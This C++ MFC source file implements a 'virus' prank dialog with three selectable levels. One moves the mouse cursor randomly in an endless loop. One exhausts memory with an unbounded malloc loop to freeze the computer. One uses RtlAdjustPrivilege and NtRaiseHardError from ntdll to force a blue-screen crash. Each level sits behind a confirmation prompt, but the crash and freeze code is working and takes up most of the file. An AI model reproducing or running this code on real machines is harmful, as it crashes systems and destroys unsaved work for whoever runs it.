// CBingdu.cpp: 实现文件
//

#include "pch.h"
#include "afxdialogex.h"
#include "CBingdu.h"
#include "resource.h"
#include <afx.h>
#include <afxwin.h>
#include <afxmsg_.h>
#include <minwindef.h>
#include <WinUser.h>
#include <afxdd_.h>
#include <Windows.h>
#include <cstdlib>
#include <winternl.h>
#include <basetsd.h>
#include <libloaderapi.h>
#include <malloc.h>
// CBingdu 对话框

IMPLEMENT_DYNAMIC(CBingdu, CDialogEx)

CBingdu::CBingdu(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_BINGDU, pParent)
{

}

void CBingdu::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_COMBO, m_combo);
}


BEGIN_MESSAGE_MAP(CBingdu, CDialogEx)
	ON_BN_CLICKED(IDOK3, &CBingdu::OnBnClickedOk3)
	ON_BN_CLICKED(IDOK2, &CBingdu::OnBnClickedOk2)
END_MESSAGE_MAP()


// CBingdu 消息处理程序
BOOL CBingdu::OnInitDialog()
{
	CDialogEx::OnInitDialog();
	m_combo.InsertString(0,L"等级一");
	m_combo.InsertString(1,L"等级二");
	m_combo.InsertString(2,L"等级三");
	m_combo.SetCurSel(0);
	return TRUE;
}

void CBingdu::OnBnClickedOk3()
{
	EndDialog(0);
}

void CBingdu::OnBnClickedOk2()
{
	int i = m_combo.GetCurSel();
	if (MessageBoxA(NULL, "即将打开病毒，只能通过重启解除！", "即将打开病毒", MB_YESNO | MB_ICONINFORMATION) == IDYES)
	{
		if (i == 0)
		{
			while (1)
			{
				SetCursorPos(rand() % 1000, rand() % 1000);
				if (GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_SHIFT) && GetAsyncKeyState('E'))
				{
					break;
				};//按下组合键停止
			}
		}
		else if (i == 1)
		{
			if (MessageBoxA(NULL, "oi,小鬼！胆子不小嘛，确定要打开卡机病毒吗？电脑将会卡爆！只能通过强制重启解除！！！请做好心理准备！！！", "即将打开卡机病毒!!!", MB_YESNO | MB_ICONINFORMATION | MB_TOPMOST) == IDYES)
			{
				for (;;)
					malloc(1000000);
				    SetCursorPos(rand() % 1000, rand() % 1000);
			}
		}
		else
		{
			if (MessageBoxA(NULL, "oi,小鬼！胆子不小嘛，确定要打开蓝屏病毒吗？只能通过强制重启解除！！！请做好心理准备！！！", "即将打开蓝屏病毒!!!", MB_YESNO | MB_ICONINFORMATION | MB_TOPMOST) == IDYES)
			{
				new int;
				typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
				typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
				BOOLEAN bEnabled;
				ULONG uResp;
				LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
				LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
				pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
				pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
				NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
				NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
			}
		}
	}
}

